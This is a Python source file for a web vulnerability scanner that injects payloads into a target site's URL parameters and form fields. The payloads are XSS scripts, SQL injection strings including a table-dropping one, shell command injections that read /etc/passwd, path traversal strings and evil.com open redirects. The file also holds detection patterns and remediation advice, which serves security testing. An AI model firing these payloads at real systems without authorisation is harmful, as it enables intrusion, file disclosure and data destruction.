"""
scanner.py — Core vulnerability detection engine.
Covers: XSS, SQLi, CSRF, Open Redirect, Command Injection, Path Traversal.
Each method returns a list of finding dicts ready to be stored.
"""

import re
import requests
from urllib.parse import urlencode, urlparse, parse_qs, urljoin


# ══════════════════════════════════════════════════════════════
#  PAYLOADS
# ══════════════════════════════════════════════════════════════

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    '"><script>alert(document.cookie)</script>',
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "'><img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    '"><svg/onload=alert(1)>',
]

SQLI_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    "' OR '1'='1'--",
    '" OR "1"="1"--',
    "'; DROP TABLE users;--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1' AND 1=2--",
    "admin'--",
    "1 OR 1=1",
]

REDIRECT_PAYLOADS = [
    "//evil.com",
    "https://evil.com",
    "//evil.com/%2F..",
    "/\\evil.com",
    "////evil.com",
]

REDIRECT_PARAMS = {
    "redirect", "redirect_uri", "redirect_url", "return", "returnto",
    "return_url", "next", "url", "target", "destination", "goto",
    "redir", "location", "link", "forward",
}

CMD_PAYLOADS = [
    "; ls",
    "| whoami",
    "&& id",
    "`id`",
    "$(id)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
]

CMD_PATTERNS = [
    re.compile(r"root:.*:0:0:", re.I),
    re.compile(r"uid=\d+\(\w+\)", re.I),
    re.compile(r"bin/bash", re.I),
    re.compile(r"Volume Serial Number", re.I),
]

PATH_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "..%2F..%2Fetc%2Fpasswd",
    "....//....//etc/passwd",
    "../../windows/system32/drivers/etc/hosts",
]

PATH_PATTERNS = [
    re.compile(r"root:.*:/bin/", re.I),
    re.compile(r"\[drivers\]", re.I),
    re.compile(r"localhost\s+127", re.I),
]

SQLI_ERRORS = [
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"warning.*mysql", re.I),
    re.compile(r"unclosed quotation mark", re.I),
    re.compile(r"quoted string not properly terminated", re.I),
    re.compile(r"ORA-\d{5}", re.I),
    re.compile(r"PostgreSQL.*ERROR", re.I),
    re.compile(r"SQLite.*error", re.I),
    re.compile(r"microsoft.*odbc.*sql", re.I),
    re.compile(r"jdbc.*exception", re.I),
    re.compile(r"supplied argument is not a valid mysql", re.I),
    re.compile(r"invalid query", re.I),
    re.compile(r"syntax error.*sql", re.I),
]

XSS_PATTERNS = [
    re.compile(r"alert\s*\(", re.I),
    re.compile(r"<script[^>]*>", re.I),
    re.compile(r"onerror\s*=", re.I),
    re.compile(r"onload\s*=", re.I),
    re.compile(r"javascript:", re.I),
]

CSRF_TOKEN_RE = re.compile(
    r"(csrf|_token|xsrf|nonce|authenticity_token|requestverificationtoken)",
    re.I,
)


# ══════════════════════════════════════════════════════════════
#  SCANNER CLASS
# ══════════════════════════════════════════════════════════════

class Scanner:
    def __init__(self, timeout: int = 10, headers: dict = None):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "VulnScan/2.0",
            **(headers or {}),
        })

    # ── Internal request helpers ───────────────────────────────

    def _get(self, url, params=None):
        try:
            return self.session.get(url, params=params, timeout=self.timeout)
        except Exception:
            return None

    def _post(self, url, data=None):
        try:
            return self.session.post(url, data=data, timeout=self.timeout)
        except Exception:
            return None

    def _get_no_redir(self, url, params=None):
        try:
            return self.session.get(
                url, params=params, timeout=self.timeout, allow_redirects=False
            )
        except Exception:
            return None

    # ── URL parameter injection helper ─────────────────────────

    def _inject_url_param(self, url, param, payload):
        """Return a URL with one query parameter replaced by payload."""
        parsed = urlparse(url)
        params = {k: v[0] for k, v in parse_qs(parsed.query, keep_blank_values=True).items()}
        params[param] = payload
        return parsed._replace(query=urlencode(params)).geturl()

    # ─────────────────────────────────────────────────────────
    #  XSS
    # ─────────────────────────────────────────────────────────

    def scan_xss(self, urls: list, forms: list) -> list:
        findings = []
        findings += self._xss_url_params(urls)
        findings += self._xss_forms(forms)
        return findings

    def _xss_reflected(self, resp, payload):
        if resp is None:
            return False
        for pat in XSS_PATTERNS:
            if pat.search(resp.text):
                return True
        return payload.lower() in resp.text.lower()

    def _xss_url_params(self, urls):
        findings = []
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            if not params:
                continue
            for param in params:
                for payload in XSS_PAYLOADS:
                    test_url = self._inject_url_param(url, param, payload)
                    resp = self._get(test_url)
                    if self._xss_reflected(resp, payload):
                        findings.append(_xss_finding(url, param, payload, "GET"))
                        break
        return findings

    def _xss_forms(self, forms):
        findings = []
        for form in forms:
            for inp in form["inputs"]:
                for payload in XSS_PAYLOADS:
                    data = _form_data(form, inp["name"], payload)
                    if form["method"] == "POST":
                        resp = self._post(form["action"], data=data)
                    else:
                        resp = self._get(form["action"], params=data)
                    if self._xss_reflected(resp, payload):
                        findings.append(_xss_finding(form["action"], inp["name"], payload, form["method"]))
                        break
        return findings

    # ─────────────────────────────────────────────────────────
    #  SQL INJECTION
    # ─────────────────────────────────────────────────────────

    def scan_sqli(self, urls: list, forms: list) -> list:
        findings = []
        findings += self._sqli_url_params(urls)
        findings += self._sqli_forms(forms)
        return findings

    def _sqli_error(self, resp):
        if resp is None:
            return None
        for pat in SQLI_ERRORS:
            m = pat.search(resp.text)
            if m:
                return m.group(0)
        return None

    def _sqli_url_params(self, urls):
        findings = []
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            if not params:
                continue
            for param in params:
                for payload in SQLI_PAYLOADS:
                    test_url = self._inject_url_param(url, param, payload)
                    resp = self._get(test_url)
                    err = self._sqli_error(resp)
                    if err:
                        findings.append(_sqli_finding(url, param, payload, "GET", err))
                        break
        return findings

    def _sqli_forms(self, forms):
        findings = []
        for form in forms:
            for inp in form["inputs"]:
                for payload in SQLI_PAYLOADS:
                    data = _form_data(form, inp["name"], payload)
                    if form["method"] == "POST":
                        resp = self._post(form["action"], data=data)
                    else:
                        resp = self._get(form["action"], params=data)
                    err = self._sqli_error(resp)
                    if err:
                        findings.append(_sqli_finding(form["action"], inp["name"], payload, form["method"], err))
                        break
        return findings

    # ─────────────────────────────────────────────────────────
    #  CSRF
    # ─────────────────────────────────────────────────────────

    def scan_csrf(self, forms: list) -> list:
        findings = []
        for form in forms:
            if form["method"] != "POST":
                continue
            all_fields = form["inputs"] + form.get("hidden", [])
            has_token  = any(CSRF_TOKEN_RE.search(f.get("name", "")) for f in all_fields)
            if not has_token:
                findings.append({
                    "type":        "CSRF",
                    "severity":    "MEDIUM",
                    "name":        "Cross-Site Request Forgery — Missing Token",
                    "url":         form["action"],
                    "param":       "N/A",
                    "payload":     "N/A",
                    "method":      "POST",
                    "evidence":    (
                        f"POST form at {form['action']} has "
                        f"{len(form['inputs'])} field(s) but no CSRF token."
                    ),
                    "description": (
                        "The form lacks a CSRF token. Attackers can trick "
                        "authenticated users into submitting unintended actions."
                    ),
                    "cvss":        6.5,
                    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
                    "remediation": (
                        "Use the Synchronizer Token Pattern: generate a random "
                        "per-session token, embed it in forms, and validate it "
                        "server-side. Flask-WTF adds this automatically."
                    ),
                    "references":  [
                        "https://owasp.org/www-community/attacks/csrf",
                        "https://cheatsheetseries.owasp.org/cheatsheets/"
                        "Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html",
                    ],
                })
        return findings

    # ─────────────────────────────────────────────────────────
    #  OPEN REDIRECT
    # ─────────────────────────────────────────────────────────

    def scan_open_redirect(self, urls: list) -> list:
        findings = []
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)

            # Test known redirect param names that exist in the URL
            redirect_params = [p for p in params if p.lower() in REDIRECT_PARAMS]
            # Also blindly probe common param names
            for rp in list(REDIRECT_PARAMS)[:8]:
                if rp not in redirect_params:
                    redirect_params.append(rp)

            for param in redirect_params:
                for payload in REDIRECT_PAYLOADS:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param] = payload
                    test_url = parsed._replace(query=urlencode(test_params)).geturl()
                    resp = self._get_no_redir(test_url)
                    if resp and resp.status_code in (301, 302, 303, 307, 308):
                        location = resp.headers.get("Location", "")
                        if "evil.com" in location:
                            findings.append({
                                "type":        "Open Redirect",
                                "severity":    "MEDIUM",
                                "name":        "Unvalidated Open Redirect",
                                "url":         url,
                                "param":       param,
                                "payload":     payload,
                                "method":      "GET",
                                "evidence":    f"HTTP {resp.status_code} → Location: {location}",
                                "description": (
                                    "An unvalidated redirect parameter lets attackers send "
                                    "users to arbitrary external URLs — commonly used in phishing."
                                ),
                                "cvss":        6.1,
                                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
                                "remediation": (
                                    "Validate redirect URLs against an allowlist of trusted domains. "
                                    "Prefer relative paths for internal redirects."
                                ),
                                "references":  [
                                    "https://cheatsheetseries.owasp.org/cheatsheets/"
                                    "Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html"
                                ],
                            })
                            break
        return findings

    # ─────────────────────────────────────────────────────────
    #  COMMAND INJECTION
    # ─────────────────────────────────────────────────────────

    def scan_command_injection(self, forms: list) -> list:
        findings = []
        for form in forms:
            for inp in form["inputs"]:
                for payload in CMD_PAYLOADS:
                    data = _form_data(form, inp["name"], payload)
                    if form["method"] == "POST":
                        resp = self._post(form["action"], data=data)
                    else:
                        resp = self._get(form["action"], params=data)
                    if resp and any(p.search(resp.text) for p in CMD_PATTERNS):
                        findings.append({
                            "type":        "CMDi",
                            "severity":    "CRITICAL",
                            "name":        "OS Command Injection",
                            "url":         form["action"],
                            "param":       inp["name"],
                            "payload":     payload,
                            "method":      form["method"],
                            "evidence":    "OS command output pattern found in response",
                            "description": (
                                "User input is passed directly to a shell command "
                                "without sanitization, allowing arbitrary OS command execution."
                            ),
                            "cvss":        9.8,
                            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                            "remediation": (
                                "Never pass user input to shell functions. Use language-level "
                                "APIs (e.g. subprocess with a list, not shell=True). "
                                "Whitelist acceptable input characters."
                            ),
                            "references":  [
                                "https://owasp.org/www-community/attacks/Command_Injection"
                            ],
                        })
                        break
        return findings

    # ─────────────────────────────────────────────────────────
    #  PATH TRAVERSAL
    # ─────────────────────────────────────────────────────────

    def scan_path_traversal(self, urls: list) -> list:
        findings = []
        FILE_PARAMS = {"file", "path", "page", "filename", "doc", "document",
                       "name", "load", "read", "template", "include"}
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            targets = [p for p in params if p.lower() in FILE_PARAMS] or list(params.keys())
            for param in targets:
                for payload in PATH_PAYLOADS:
                    test_url = self._inject_url_param(url, param, payload)
                    resp = self._get(test_url)
                    if resp and any(p.search(resp.text) for p in PATH_PATTERNS):
                        findings.append({
                            "type":        "Path Traversal",
                            "severity":    "HIGH",
                            "name":        "Path / Directory Traversal",
                            "url":         url,
                            "param":       param,
                            "payload":     payload,
                            "method":      "GET",
                            "evidence":    "Sensitive file contents detected in response",
                            "description": (
                                "Unsanitized file path parameter allows reading arbitrary "
                                "files on the server using ../ sequences."
                            ),
                            "cvss":        7.5,
                            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                            "remediation": (
                                "Validate file paths against an allowlist. "
                                "Use os.path.basename() to strip directory components. "
                                "Run the web server with minimal file-system permissions."
                            ),
                            "references":  [
                                "https://owasp.org/www-community/attacks/Path_Traversal"
                            ],
                        })
                        break
        return findings


# ══════════════════════════════════════════════════════════════
#  PRIVATE HELPERS
# ══════════════════════════════════════════════════════════════

def _form_data(form: dict, target_name: str, payload: str) -> dict:
    """Build a form submission dict with payload injected into one field."""
    data = {i["name"]: i["value"] for i in form["inputs"]}
    data.update({h["name"]: h["value"] for h in form.get("hidden", [])})
    data[target_name] = payload
    return data


def _xss_finding(url, param, payload, method):
    return {
        "type":        "XSS",
        "severity":    "HIGH",
        "name":        "Reflected Cross-Site Scripting (XSS)",
        "url":         url,
        "param":       param,
        "payload":     payload,
        "method":      method,
        "evidence":    f"Payload reflected unescaped in response: {payload[:80]}",
        "description": (
            "User input is reflected in the HTTP response without proper encoding. "
            "Attackers can inject arbitrary JavaScript that executes in victims' browsers, "
            "leading to session theft, credential harvesting, or malware delivery."
        ),
        "cvss":        7.2,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
        "remediation": (
            "HTML-encode all user-supplied output using context-aware encoding. "
            "Implement a strict Content Security Policy. "
            "Use templating engines with auto-escaping (e.g. Jinja2 autoescape=True). "
            "Validate and whitelist input on the server side."
        ),
        "references":  [
            "https://owasp.org/www-community/attacks/xss/",
            "https://cheatsheetseries.owasp.org/cheatsheets/"
            "Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
        ],
    }


def _sqli_finding(url, param, payload, method, error_snippet):
    return {
        "type":        "SQLi",
        "severity":    "CRITICAL",
        "name":        "SQL Injection (Error-Based)",
        "url":         url,
        "param":       param,
        "payload":     payload,
        "method":      method,
        "evidence":    f"Database error pattern matched: {error_snippet}",
        "description": (
            "The application constructs SQL queries using unsanitized user input. "
            "Attackers can extract, modify, or delete database contents and may "
            "achieve remote code execution on some database engines."
        ),
        "cvss":        9.8,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "remediation": (
            "Use parameterized queries (prepared statements) for ALL database interactions. "
            "Never concatenate user input into SQL strings. "
            "Adopt an ORM with built-in escaping. "
            "Disable verbose DB error messages in production. "
            "Apply least-privilege DB accounts."
        ),
        "references":  [
            "https://owasp.org/www-community/attacks/SQL_Injection",
            "https://cheatsheetseries.owasp.org/cheatsheets/"
            "SQL_Injection_Prevention_Cheat_Sheet.html",
        ],
    }
